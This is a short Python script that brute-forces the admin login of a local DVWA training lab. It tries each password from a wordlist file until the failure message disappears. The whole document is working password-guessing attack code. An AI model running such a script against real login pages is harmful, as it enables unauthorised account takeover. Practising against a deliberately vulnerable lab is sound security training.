import requests
if __name__ == '__main__':
    list_passwords = []
    with open("passwords.txt", "r") as file:
        for readline in file:
            line_strip = readline.strip()
            list_passwords.append(line_strip)
    cookies = {'security': 'low', 'security': 'low', 'PHPSESSID': 'vpn8h3a0nclm755k78bgc2erh6'}
    for password in list_passwords:
        request = requests.get(
            f'http://localhost/dvwa/vulnerabilities/brute/?username=admin&password={password}&user_token=TOKEN&Login=Login',
            auth=('admin', 'password'), verify=False, cookies=cookies)
        if "Username and/or password incorrect." not in request.text:
            print(f"Login = admin, Correct password = {password}")
            break